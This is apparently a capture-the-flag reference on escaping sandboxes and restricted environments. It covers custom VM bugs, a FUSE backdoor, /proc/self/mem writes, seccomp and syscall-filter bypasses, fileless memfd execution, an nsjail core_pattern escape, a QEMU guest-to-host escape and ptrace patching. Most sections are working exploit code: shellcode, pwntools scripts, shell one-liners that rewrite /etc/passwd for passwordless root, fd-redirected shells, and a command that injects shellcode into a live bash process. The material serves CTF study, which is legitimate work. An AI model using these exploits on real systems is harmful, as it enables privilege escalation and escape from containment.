# Sandbox Escape and Restricted Environments

## Table of Contents
- [Python Sandbox Escape](#python-sandbox-escape)
- [VM Exploitation (Custom Bytecode)](#vm-exploitation-custom-bytecode)
- [FUSE/CUSE Character Device Exploitation](#fusecuse-character-device-exploitation)
- [Busybox/Restricted Shell Escalation](#busyboxrestricted-shell-escalation)
- [Shell Tricks](#shell-tricks)
- [File Descriptor Inheritance via Missing `O_CLOEXEC`](#file-descriptor-inheritance-via-missing-o_cloexec)
- [Write-Anywhere via /proc/self/mem]
- [process_vm_readv Failure as Sandbox Escape]
- [Named Pipe mkfifo for File Size Check Bypass]
- [Lua Integer Underflow via Game Logic]
- [CPU Emulator Print Opcode Python eval Injection]
- [Unicorn Emulator Syscall Blacklist Bypass via sysenter and Uncommon Syscalls]
- [Custom VM swap Pointer Self-Overwrite]

-

## Python Sandbox Escape

Python jail/sandbox escape techniques are covered comprehensively in the `ctf-misc` skill — invoke `/ctf-misc` for pyjail techniques.

## VM Exploitation (Custom Bytecode)

**Pattern:** Custom VM with registers, opcodes, syscalls. Full RELRO + NX + PIE.

**Common vulnerabilities in VM syscalls:**
- **OOB read/write:** `inspect(obj, offset)` and `write_byte(obj, offset, val)` without bounds checking allows read/modify object struct data beyond allocated buffer
- **Struct overflow via name:** `name(obj, length)` writing directly to object struct allows overflowing into adjacent struct fields

**Exploitation pattern:**
1. Allocate two objects (data + exec)
2. Use OOB `inspect` to read exec object's XOR-encoded function pointer to leak PIE base
3. Use `name` overflow to rewrite exec object's pointer with `win() ^ KEY`
4. `execute(obj)` decodes and calls the patched function pointer

## FUSE/CUSE Character Device Exploitation

**FUSE** (Filesystem in Userspace) / **CUSE** (Character device in Userspace)

**Key insight:** FUSE/CUSE devices run handler code in userspace with the permissions of the device daemon. If the daemon runs as root and exposes a command interface via the write handler, any user who can write to the device file gains root-level operations (chmod, file read/write).

**Identification:**
- Look for `cuse_lowlevel_main()` or `fuse_main()` calls
- Device operations struct with `open`, `read`, `write` handlers
- Device name registered via `DEVNAME=backdoor` or similar

**Common vulnerability patterns:**
```c
// Backdoor pattern: write handler with command parsing
void backdoor_write(const char *input, size_t len) {
    char *cmd = strtok(input, ":");
    char *file = strtok(NULL, ":");
    char *mode = strtok(NULL, ":");
    if (!strcmp(cmd, "b4ckd00r")) {
        chmod(file, atoi(mode));  // Arbitrary chmod!
    }
}
```

**Exploitation:**
```bash
# Change /etc/passwd permissions via custom device
echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor

# 511 decimal = 0777 octal (rwx for all)
# Now modify passwd to get root
echo "root::0:0:root:/root:/bin/sh" > /etc/passwd
su root
```

**Privilege escalation via passwd modification:**
1. Make `/etc/passwd` writable via the backdoor
2. Replace root line with `root::0:0:root:/root:/bin/sh` (no password)
3. `su root` without password prompt

## Busybox/Restricted Shell Escalation

When in restricted environment without sudo:
1. Find writable paths via character devices
2. Target system files: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
3. Modify permissions then content to gain root

**Key insight:** In restricted environments without sudo, look for custom character devices or writable system files. Any write primitive to `/etc/passwd` (remove root's password hash) or `/etc/sudoers` (add NOPASSWD entry) gives root.

## Shell Tricks

**File descriptor redirection (no reverse shell needed):**
```bash
# Redirect stdin/stdout to client socket (fd 3 common for network)
exec <&3; sh >&3 2>&3

# Or as single command string
exec<&3;sh>&3
```
- Network servers often have client connection on fd 3
- Avoids firewall issues with outbound connections
- Works when you have command exec but limited chars

**Find correct fd:**
```bash
ls -la /proc/self/fd           # List open file descriptors
```

**Short shellcode alternatives:**
- `sh<&3 >&3` - minimal shell redirect
- Use `$0` instead of `sh` in some shells

**Key insight:** Network servers typically have the client socket on fd 3. Redirecting stdin/stdout to this fd (`exec <&3; sh >&3 2>&3`) gives an interactive shell over the existing connection without needing outbound connectivity for a reverse shell.

## File Descriptor Inheritance via Missing `O_CLOEXEC`

**Pattern:** A service opens a secret-bearing file descriptor without `O_CLOEXEC` / `MFD_CLOEXEC`, then later reaches `system()`, `popen()`, or another `fork()+exec()` path. The child inherits the descriptor.

**Fast exploitation path:**
1. infer or leak the live FD number,
2. read `/proc/self/fd/N` from the child context,
3. if keyword filters block `proc` or `fd`, split the strings with shell quotes (`p'r'oc`, `f'd'`).

**Key insight:** This is runtime hygiene failure, not a shell metacharacter trick. Once the exec boundary preserves the descriptor, `/proc/self/fd/N` turns it back into a readable file path.

-

## Write-Anywhere via /proc/self/mem

When a service allows writing to arbitrary files at arbitrary offsets, target `/proc/self/mem` for code injection or modification:

```python
from pwn import *

# Service API: send filename, offset, content
def write_mem(r, offset, data):
    r.sendline(b'/proc/self/mem')
    r.sendline(str(offset).encode())
    r.sendline(data)

# 1. Leak a return address from the stack (or use known binary address)
# 2. Write shellcode to a writable+executable region (or reuse existing code)
# 3. Overwrite return address to point to shellcode

shellcode = asm(shellcraft.sh())

r = remote(host, port)
# Overwrite code at known address (e.g., after close@plt returns)
write_mem(r, target_code_addr, shellcode)
```

**Advanced techniques with restricted writes:**
- **Code overwrite for control flow change:** Write flag bytes that form valid opcodes to nop critical instructions (e.g., `call _exit` → `push r12` using flag prefix)
- **Libc function modification:** Overwrite libc function prelude (e.g., `sub rsp, 0x68` → `sub rsp, 0x43`) to change stack alignment, enabling stack pivot to ROP in input buffer
- **String oracle for blind exfiltration:** Overwrite format strings or scanf patterns to leak flag char-by-char via parsing failures

**Example: Stack pivot via libc overwrite**
```python
# Overwrite open64 prologue to adjust stack frame
# Original: sub rsp, 0x68 → sub rsp, 0x43 (using flag char)
write_mem(r, libc.sym['open64'], flag_char)

# ROP chain in input buffer: align stack + onegadget
rop = p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
write_mem(r, input_buffer_addr, rop)
```

**Key insight:** `/proc/self/mem` provides random-access read/write to the process's virtual memory, bypassing page protections that mmap enforces. Writing to text segments (code) works even when the segment is mapped read-only via normal mmap - the kernel performs the write through the page tables directly. This makes it equivalent to a debugger `PTRACE_POKETEXT`. With restricted write zones, use flag content as opcodes or leverage libc functions for stack manipulation.

**Requirements:** File write primitive must handle binary data (null bytes). The target offset must be a valid mapped virtual address. Flag content may be used as payload when direct writes are restricted.

-

### process_vm_readv Failure as Sandbox Escape

**Pattern:** Sandbox validates file paths by calling `process_vm_readv()` then `realpath()`. By mapping memory with `PROT_READ` only (not remotely readable by `process_vm_readv` from the sandbox process), path validation fails silently, bypassing the check.

```c
// Create memory at fixed address with only read permission
mmap(0x13370000, 0x1000, PROT_READ, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
// Store path string there - sandbox's process_vm_readv fails
// realpath() also fails - path check bypassed entirely
// Then: open("/flag") succeeds through the sandbox
```

**Key insight:** Sandbox path validation using `process_vm_readv` assumes validation will succeed or deny. The failure case (unreadable memory) is unhandled, creating a bypass. The sandboxed process can read its own memory normally, but the supervisor process cannot read it via `process_vm_readv`.

-

### Named Pipe mkfifo for File Size Check Bypass

**Pattern:** Binary reads a file and checks its size before processing. Named pipes (FIFOs) report `st_size = 0` via `stat()` but deliver arbitrary data when read, bypassing size-based overflow prevention.

```bash
mkfifo /tmp/payload_pipe
# In background, feed overflow payload to the pipe
cat exploit_data > /tmp/payload_pipe &
# Binary sees size=0, skips bounds check, reads arbitrary data./vulnerable_binary /tmp/payload_pipe
```

Combine with symlinks for string reuse: `ln -s /flag arena.c` uses an existing string in the binary as the target filename for a ROP chain.

**Key insight:** Named pipes always report `st_size = 0` in `stat()`, bypassing any size-based buffer allocation or bounds checks while delivering arbitrary-length data via `read()`. Any binary that uses `stat()` to pre-allocate or validate before `read()` is vulnerable.

-

### Lua Integer Underflow via Game Logic

**Pattern:** Text-based game (written in Lua) with inventory management. Two independent percentage reductions are applied sequentially to the same value without capping the combined result: a 100% decay applied first zeros the inventory, then a 10% penalty applied to the already-zero value causes an integer underflow below zero. Selling the underflowed items generates unlimited money (the game treats a large negative count as a large positive sale value or wraps to unsigned max).

**Vulnerable logic:**
```lua
- Applied sequentially, no combined-total check:
inventory = inventory - math.floor(inventory * 0.10)  - 10% penalty first
inventory = inventory - math.floor(inventory * 1.00)  - 100% decay = zeroed

- If applied in the other order, or combined:
- 100% decay → inventory = 0
- 10% of 0 = 0 → total reduction = 100%, no underflow

- But with uncapped sequential application:
- Step 1: inventory -= inventory * decay_rate  (e.g., decay=100% → 0)
- Step 2: inventory -= extra_penalty           (penalty on already-zero → negative)
- Result: inventory = -penalty_amount  (wraps or treated as large positive)
```

**Exploitation:**
```python
# 1. Identify the two independent reduction events in the game loop
#    (e.g., end-of-round decay AND a transaction penalty)
# 2. Trigger both in the same game tick without intermediate capping
# 3. Verify inventory went negative (may display as large number or 0 + debt)
# 4. Sell the underflowed items: game calculates price * negative_count
#    → negative total, or wraps to huge positive → unlimited currency
# 5. Use unlimited currency to purchase the flag item
```

**Key insight:** Business logic bugs in game economies create integer underflows without any memory corruption — two uncapped percentage reductions exceeding 100% underflow the target variable. Look for any game mechanic that applies multiple independent percentage modifications to the same integer value in the same tick.

-

### CPU Emulator Print Opcode Python eval Injection

**Pattern:** Custom CPU emulator's print function uses `eval('"' + string_buffer + '"')` to process escape sequences in the output. Build a string in emulator memory character-by-character using ADD opcodes, then inject: `"+__import__("os").system("cmd")#` to escape the string literal and execute arbitrary Python.

**Exploitation strategy:**
1. The emulator implements a custom instruction set with ADD, MOV, PRINT, etc.
2. The PRINT opcode reads a string from emulator memory and passes it to `eval('"' + s + '"')` to handle escape sequences like `\n`, `\t`
3. Use ADD opcodes to build the injection string character-by-character in emulator memory
4. The injected string `"+__import__("os").system("cmd")#` closes the opening quote, concatenates with `__import__("os").system()`, and `#` comments out the trailing quote

```python
from pwn import *

# Emulator opcodes (example encoding)
ADD = 0x01   # ADD addr, immediate_byte
PRINT = 0x58  # Print string from memory (triggers eval)

def build_char(c):
    """Generate ADD opcodes to set a memory byte to character c"""
    addr = current_mem_ptr()
    return bytes([ADD, addr, ord(c)])

# Build injection payload in emulator memory
cmd = "cat /flag"
injection = '''"+__import__("os").system("%s")#''' % cmd

program = b""
for c in injection:
    program += build_char(c)

# Trigger PRINT opcode -> eval('"' + injection + '"')
# eval becomes: eval('""+__import__("os").system("cat /flag")#"')
# The # comments out the trailing quote
program += bytes([PRINT, 0x00])  # PRINT from address 0

io = remote('target', 1337)
io.send(program)
io.interactive()
```

**Key insight:** When an emulator or interpreter uses `eval()` to process string output (e.g., for escape sequences), inject a quote to close the string literal, then chain arbitrary Python code. The `#` comment character truncates any trailing syntax. This is a classic eval injection - the emulator trusts its own memory contents, but the attacker controls memory via normal CPU opcodes.

-

### Unicorn Emulator Syscall Blacklist Bypass via sysenter and Uncommon Syscalls

**Pattern:** A Unicorn-based shellcode runner hooks `UC_HOOK_INSN` for `int 0x80` and `UC_HOOK_MEM_*` to block forbidden syscall numbers (execve, read, write, mmap). The filter only covers the `int 0x80` entry and the handful of syscalls the authors thought of.

**Bypass:**
1. Use `sysenter` instead of `int 0x80` — Unicorn's `INT` hook does not fire on the fast entry path.
2. Use functionally equivalent syscalls that are not on the blacklist:
   - `dup3` instead of `dup2`
   - `openat` instead of `open`
   - `pread64` instead of `read`
   - `sendfile` to move a file descriptor's contents straight to another fd without touching `write`
3. Stage the payload so the final stage is `execve("/bin/sh",...)` via `sys_socketcall` (opcode `0x66`) + crafted syscall-mode transition, if even `execve` is in the blacklist.

```asm; Swap file from /flag to stdout without read/write
mov eax, 0x123; __NR_openat
mov ebx, -100; AT_FDCWD
lea ecx, [flag_path]
xor edx, edx
sysenter; NOT int 0x80 — bypasses Unicorn INT hook; fd is now in eax
mov ebx, eax; src fd
mov ecx, 1; dst fd (stdout)
xor edx, edx; NULL offset
mov esi, 0x1000; count
mov eax, 0xbb; __NR_sendfile
sysenter
```

**Key insight:** Instruction-level filters in Unicorn hook specific opcodes. If the filter only watches `int 0x80`, any other syscall entry (`sysenter`, `syscall`, `int 0x2e` on x86-32 test builds) slips through. Always enumerate functionally equivalent syscalls: `dup3/openat/pread64/sendfile/writev/mmap2` cover almost everything a blacklist of `execve/read/write/mmap` forgets.

-

## Custom VM swap Pointer Self-Overwrite

**Pattern:** A custom VM exposes a `swap(a, b)` instruction that reads two stack indices relative to the saved `sp`. If the VM never validates that `sp_nxt` is within bounds, calling `swap(-1, 0)` or `swap(-2, -1)` addresses the internal `sp_nxt` itself and exchanges it with a stack slot. Subsequent instructions then operate on arbitrary memory.

```text
swap(-1, 0)     # treats &sp_nxt as stack[-1]; swaps sp_nxt <-> stack[0]
# sp_nxt now points wherever stack[0] used to; writes go anywhere
```

Chain with a `push` that stores shellcode bytes at the new pointer, then redirect a function pointer from the VM's dispatch table to the shellcode region.

**Key insight:** Any VM primitive that rewrites its own state pointer is an immediate arbitrary-write primitive. Always probe VM opcodes for boundary conditions where the stack pointer itself is addressable.

## Self-Modifying Shellcode with Restricted Opcodes

**Pattern:** Shellcode execution restricted to specific opcode ranges (e.g., 0-5), with seccomp limiting syscalls. Use self-modifying code to generate forbidden opcodes via allowed instructions, then escape to unrestricted shellcode via read syscall.

**Allowed opcodes (example 0-5):**
- `add al, imm8` (04)
- `add eax, imm32` (05)
- `add [rip+0], al` (00 05 00 00 00 00)
- `add [rip+0], eax` (01 05 00 00 00 00)

**Exploitation:**
1. Use `add [rip+0], al/eax` to modify subsequent instructions, generating needed opcodes
2. Increment registers (e.g., `add eax, imm32`) to set syscall numbers
3. Build `lea rsi, [rip]` to point to self for read destination
4. Execute `read(0, rsi, size)` to overwrite with unrestricted shellcode
5. Unrestricted shellcode performs open/read/write to dump flag

**Code example:**
```python
# Generate opcodes with add [rip+0], al/eax
sc = equalize(current_eax, target_eax)  # Add instructions to set register
sc += 'add [rip+0],eax\n.byte 5,5,5,5\n'  # Modify next bytes

# Create lea rsi,[rip] by modifying placeholder
sc += 'add al,5\n' * adjustments
sc += 'add [rip+0],al\n.byte 5,0,4,0,0\n'  # Build mov edx, 0x400

shellcode = asm(sc)
# Send, then send unrestricted shellcode via read
```

**Key insight:** Self-modification allows bypassing opcode restrictions by treating code as data. Use `add [rip+0], ...` to increment instruction bytes incrementally, generating any opcode. Combine with syscall escaping for full control.

**Requirements:** Executable memory, ability to modify code section, read syscall allowed for payload staging.

## Seccomp Bypass via vDSO Reuse and Mode Switching

**Pattern:** Seccomp filters block syscall instructions (`syscall`, `int 0x80`) but allow certain syscalls. To bypass, reuse vDSO's `syscall; ret` sequence for making syscalls without the forbidden instruction, switch to 32-bit mode for unrestricted 32-bit syscalls, and map executable memory to handle sysenter returns.

**Full chain:**
1. **Leak vDSO base** from auxv on stack (AT_SYSINFO_EHDR type 0x21)
2. **Extract syscall gadget** at known offset in vDSO (e.g., 0xc7b)
3. **Bypass open restrictions** by placing pathname at required address via linker script (.bss at 0x31000 for 0x31337)
4. **Switch to 32-bit mode** using iretq with CS=0x23
5. **Map executable memory** at low 32-bit vDSO address using sysenter (which returns to mapped region)
6. **Execute 32-bit syscalls** via sysenter for read/write operations
7. **Exit with expected status** to trigger flag output

**Key components:**
- **vDSO syscall reuse:** vDSO contains `syscall; ret` sequences at predictable offsets
- **Mode switching:** iretq with CS=0x23 switches to IA-32e compatibility mode
- **sysenter handling:** Map ELF file at low vDSO address so sysenter returns to executable code
- **Linker control:** Set .bss base address for address-specific restrictions

**Code example:**
```asm
; Leak vDSO from auxv
loop1: pop rax
       cmp rax, 0x21  ; AT_SYSINFO_EHDR
       jne loop1
       pop rsi         ; vDSO base

; Use vDSO syscall gadget
lea rbx, [rsi+0xc7b]  ; syscall; ret in vDSO

; Switch to 32-bit
lea rsp, [sspace]
lea rcx, [next2]
push 0x23             ; CS for 32-bit
push rcx              ; RIP
iretq

; 32-bit code
next2:
; mmap for sysenter return
push 0                ; offset
push 3                ; fd (hash file)
push 0x11             ; flags
push 5                ; prot
push 0x3000           ; len
push ebx              ; addr (low vDSO)
mov ebx, esp
call do_sysenter      ; sysenter returns to mapped region

; Read/write flag
mov eax, 3            ; SYS_read
mov ebx, 4            ; flag fd
mov ecx, 0x31337      ; buf
mov edx, 128          ; size
call do_sysenter

mov edx, eax          ; bytes read
mov eax, 4            ; SYS_write
mov ebx, 1            ; stdout
call do_sysenter

do_sysenter:
mov ebp, esp
sysenter              ; syscall via sysenter

; NOP sled for return
times 4096 db 0xc3
```

**Requirements:**
- Seccomp allows specific syscalls but blocks syscall instructions
- vDSO mapped and accessible
- Ability to control binary layout (linker script)
- 64-bit to 32-bit mode switching supported

**Key insight:** vDSO provides syscall gadgets without embedding forbidden instructions. Mode switching enables 32-bit syscalls with fewer restrictions. Mapping executable regions handles sysenter's fixed return path.

-

## 0x66 Operand-Size Prefix Syscall Filter Bypass (x86-64)

**Pattern:** A seccomp BPF filter or shellcode scanner checks for the 2-byte sequence `0x0f 0x05` (`syscall` on x86-64). Prefix `0x66` (operand-size override) before `syscall` produces the 3-byte sequence `0x66 0x0f 0x05`. The CPU executes it identically — the prefix is silently ignored in 64-bit mode — but signature-based filters that look for `\x0f\x05` miss it.

```python
shellc = asm('''
    mov edi, 0x10000
    mov esi, 4096
    push 3
    pop rdx
    push 0x22
    pop r10
    xor r8, r8
    xor r9, r9
    push 9
    pop rax
    .byte 0x66      # operand-size prefix — ignored by CPU, bypasses pattern filter
    syscall         # 0x0f 0x05 → emitted as 0x66 0x0f 0x05 → mmap

    mov esi, eax
    xor edi, edi
    xor eax, eax
    push 8
    pop rdx
    .byte 0x66
    syscall         # read

    mov rdi, rsi
    xor esi, esi
    xor edx, edx
    push 59
    pop rax
    .byte 0x66
    syscall         # execve
''')
```

**When to use:** Shellcode sandbox that bans `\x0f\x05` byte pattern but does not decode full x86 instruction streams. Does NOT bypass BPF-level seccomp installed by the kernel (`prctl(PR_SET_SECCOMP, ...)`), which checks at the syscall entry point after the CPU has already decoded the instruction.

**Key insight:** The `0x66` prefix is a legal prefix in x86-64; the CPU ignores it for `syscall` but many pattern scanners do not handle prefixed instructions. Distinct from the 32-bit use of `0x66` for `sys_socketcall` (different context entirely).

-

## memfd_create + execveat: Fileless ELF Execution on Read-Only Filesystem

**Pattern:** A remote system has a read-only filesystem — no `/tmp`, no `/dev/shm`, no writable paths anywhere. To execute a compiled exploit binary, create an anonymous in-memory file using `memfd_create`, write the ELF into it, then execute it with `execveat`. The file never touches disk; it lives at `/proc/<pid>/fd/<N>`.

```c
#include <sys/syscall.h>

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(319, name, flags);   // __NR_memfd_create = 319 on x86-64
}

int main() {
    int fd = memfd_create("payload", 0);
    write(fd, elf_bytes, elf_size);     // write ELF content

    // execveat(fd, "", argv, envp, AT_EMPTY_PATH)
    syscall(322, fd, "", NULL, environ, 0x1000);  // AT_EMPTY_PATH=0x1000
}
```

**Stage 1: inject shellcode into a running bash process via `/proc/<pid>/mem`:**

```bash
# Bash one-liner: reads /proc/self/syscall to find text segment, writes shellcode
cd /proc/$$; read a<syscall; exec 3>mem; echo <base64-shellcode>|base64 -d|dd bs=1 seek=$[`echo $a|cut -d" " -f9`]>&3
```

**Stage 2 shellcode: read hex-encoded ELF from stdin, decode, write to memfd, execveat:**

```python
from pwn import *
context.arch = 'amd64'

shellcode = asm('''
memfd:
    xor esi, esi
    xor eax, eax
    mov ax, 319
    mov rdi, rsp
    syscall
    mov ebp, eax          # store memfd fd

read_hex:
    xor edi, edi
    mov rsi, rsp
    xor eax, eax
    push 2
    pop rdx
    syscall
    mov al, [rsi]
    cmp al, 0x2e          # "." = EOF marker
    jz execveat
    # hex decode two chars → one byte, write to memfd
    # ... (see full decode loop in exploit)
    jmp read_hex

execveat:
    push rbp
    pop rdi
    xor eax, eax
    cdq
    mov ax, 322           # __NR_execveat
    push rdx
    pop r10
    xor ecx, ecx
    mov ch, 0x10          # AT_EMPTY_PATH
    push rcx
    pop r8
    push rdx
    mov rsi, rsp
    syscall
''')
```

**Key insight:** `memfd_create` creates an anonymous file in RAM accessible at `/proc/<pid>/fd/<n>`. `execveat` with `AT_EMPTY_PATH` executes directly from an fd without any pathname, bypassing `noexec` mounts and read-only filesystem restrictions. The file descriptor path can be used anywhere a filename is required, including as a `dlopen` target.

-

## nsjail Escape via /proc/sys/kernel/core_pattern + modprobe

**Pattern:** When running as root inside an nsjail with `/proc` mounted and writable, write a malicious script to `/proc/sys/kernel/modprobe` and set `/proc/sys/kernel/core_pattern` to execute it via the kernel core dump handler. Causing any process to crash triggers the handler **outside** the jail, with host filesystem access.

**Why it works:** `core_pattern` is read by the kernel when a process dumps core. If the pattern starts with `|`, the kernel executes the rest as a command in the **initial PID namespace** (outside the container/jail). `modprobe` is called by the kernel when loading unknown modules, also outside the container.

**Exploitation steps:**

```bash
# 1. Write a script to modprobe (the kernel calls this for unknown binaries)
echo '/bin/busybox cat /root/* > /proc/sys/kernel/modprobe' > /proc/sys/kernel/modprobe

# 2. Set core_pattern to pipe into that script
echo '|/bin/busybox sh /proc/sys/kernel/modprobe' > /proc/sys/kernel/core_pattern

# 3. Crash any process (signal 11, or run an invalid ELF)
bash -c 'kill -11 $$'
# OR: run a non-ELF binary (triggers modprobe path)

# 4. Read the flag written back to modprobe
cat /proc/sys/kernel/modprobe
```

**Requirements:**
- Running as root (uid=0) inside the jail
- `/proc` is mounted and the jail does not restrict writes to `/proc/sys`
- Busybox or another shell is available at a known path

**Key insight:** `/proc/sys/kernel/core_pattern` and `/proc/sys/kernel/modprobe` are writable by root and interpreted by the **host kernel**, not the jail. Writing to them persists across jail boundaries. This is a well-known container escape technique; mitigated by read-only `/proc/sys` or by running as non-root.

-

## QEMU PCI Device MMIO Out-of-Bounds Escape (Guest → Host)

**Pattern:** A custom QEMU PCI device implements MMIO read/write handlers that use an **offset field from guest-controlled MMIO registers** to index into an internal buffer without bounds checking. The device driver struct lays out as: `[PCIDevice header][state fields][buff[BUFF_SIZE]][MemoryRegion]`. Writing an `off` value beyond `BUFF_SIZE` addresses the `MemoryRegion` or other struct fields — giving host read/write via DMA primitives.

**Identification:**
```bash
# Inside QEMU guest
lspci                          # find the custom device (e.g., 1234:dead)
cat /sys/devices/pci0000:00/0000:00:05.0/resource   # get MMIO base address
```

**Access the MMIO region:**
```c
#include <fcntl.h>
#include <sys/mman.h>

int fd = open("/dev/mem", O_RDWR | O_SYNC);
volatile uint64_t *mmio = mmap(0, 0x10000, PROT_READ|PROT_WRITE,
                                MAP_SHARED, fd, MMIO_BASE);
// OR use /sys/.../resource0 for direct PCI BAR mapping
```

**Typical MMIO register layout (example):**
```c
// Writing to offset 0x00: triggers DMA copy between guest phys addr and internal buff
// Offset 0x04: src (guest physical address for DMA)
// Offset 0x08: off (index into internal buff[BUFF_SIZE])
mmio[0x04/8] = guest_phys;    // set DMA source/dest
mmio[0x08/8] = overflow_off;  // OOB offset beyond BUFF_SIZE
mmio[0x00/8];                 // trigger the DMA read/write
```

**Exploitation chain:**
1. **Leak host address:** Set `off` past `buff[]` to read from adjacent `MemoryRegion` struct (contains host pointers). DMA reads those bytes into guest memory.
2. **Calculate host heap address** of the `MariaState` or QEMU heap object.
3. **Overwrite host function pointer** in `MemoryRegion.ops` or similar — with `off` pointing to `ops->read/write` function pointer.
4. **Trigger the overwritten function** via another MMIO access → host code execution.

**Guest-to-physical address translation:**
```c
// /proc/self/pagemap maps virtual to physical page frame numbers
uint64_t virt_to_phys(void *addr) {
    int fd = open("/proc/self/pagemap", O_RDONLY);
    uint64_t paddr;
    pread(fd, &paddr, 8, ((uint64_t)addr / 4096) * 8);
    close(fd);
    return ((paddr & 0x7fffffffffffff) << 12) | ((uint64_t)addr & 0xfff);
}
```

**Key insight:** Custom QEMU devices often skip bounds checks on the `off` field because the `src`/`off` are guest-controlled MMIO registers. Any OOB into `MemoryRegion.ops` replaces the function pointer table with an attacker-controlled value, giving arbitrary code execution in the QEMU host process. Mitigation: validate `off < BUFF_SIZE` before every DMA operation.

---

## ptrace(PTRACE_POKEDATA) Protection Bypass

**Pattern:** Parent process with arbitrary code execution uses `ptrace` to attach to a sibling/child process, overwrite its memory, then detach — bypassing seccomp, stack canaries, or other runtime protections installed after start.

**When to use:** You control a forking server where parent and child share the same UID; the child installs seccomp or position-independent ASLR mitigations after fork. From the parent (or another process with same UID), use ptrace to patch the child's `.text` or `.bss` before the protection applies.

**Shellcode (x86-64) to patch a child process:**
```asm
; rbp = pid of child (passed before shellcode executes)
; PTRACE_ATTACH (16) the child
mov edi, 0x10          ; PTRACE_ATTACH
mov esi, ebp           ; pid
xor edx, edx
xor r10, r10
mov eax, 101           ; ptrace syscall
syscall

; wait for it to stop (busy-loop or waitpid)
mov rcx, 0xffffffff
wait_loop:
  nop; nop
  loop wait_loop

; PTRACE_POKEDATA (5): write 8 bytes at target address
mov edi, 5             ; PTRACE_POKEDATA
mov esi, ebp           ; pid
mov edx, 0x4018df      ; address to patch
mov r10, 0x9090909090000000  ; replacement bytes (NOP sled over protective call)
mov eax, 101
syscall

; PTRACE_DETACH (17)
mov edi, 0x11
mov esi, ebp
xor edx, edx
xor r10, r10
mov eax, 101
syscall
```

**pwntools integration:**
```python
# Shellcode that extracts child pid, attaches, patches memory, detaches
shellc = asm('''
  mov ebp, %d      /* pid of child process */
  mov edi, 0x10    /* PTRACE_ATTACH */
  mov esi, ebp
  xor edx, edx
  xor r10, r10
  mov eax, 101
  syscall
  /* busy-wait */
  mov rcx, 0xffffffff
wait:
  nop; loop wait
  /* patch address 0x4018df: overwrite call to protective function */
  mov edi, 5
  mov esi, ebp
  mov edx, 0x4018df
  mov r10, 0xE800402090bf9090
  mov eax, 101
  syscall
  /* detach */
  mov edi, 0x11
  mov esi, ebp
  xor edx, edx
  xor r10, r10
  mov eax, 101
  syscall
  jmp $
''' % target_pid)

# Deliver shellcode via mmap RWX region allocation primitive
p.sendlineafter('> ', '1')            # option: allocate writable memory
p.sendlineafter('be?\n', '140000')    # size
p.sendlineafter('y?\n', '7')          # PROT_READ|PROT_WRITE|PROT_EXEC
p.sendlineafter('de?\n', shellc)      # write shellcode to it
buf_addr = int(p.recvuntil('\n', drop=True), 16)

p.sendlineafter('> ', '3')            # option: execute at address
p.sendlineafter('code?\n', hex(buf_addr))
```

**Requirements and constraints:**
- Attacker and target must share a UID (or attacker is root)
- `/proc/sys/kernel/yama/ptrace_scope` must be 0 or 1 (not 2/3); scope=1 still allows ptrace of processes you started
- `CAP_SYS_PTRACE` required on scope≥2 systems
- Child must not call `prctl(PR_SET_DUMPABLE, 0)` before you attach
- Each `PTRACE_POKEDATA` writes exactly one `long` (8 bytes on x86-64, 4 bytes on 32-bit)

**Key insight:** `ptrace` predates seccomp as a Linux mechanism. A process can patch another same-UID process's memory freely unless ptrace_scope is locked down — useful when: (a) you can RCE the parent before seccomp is installed in child, (b) a long-running server forks and the parent has a weaker security posture than the child, or (c) you have arbitrary shellcode in one thread and want to remove a mitigation from another.
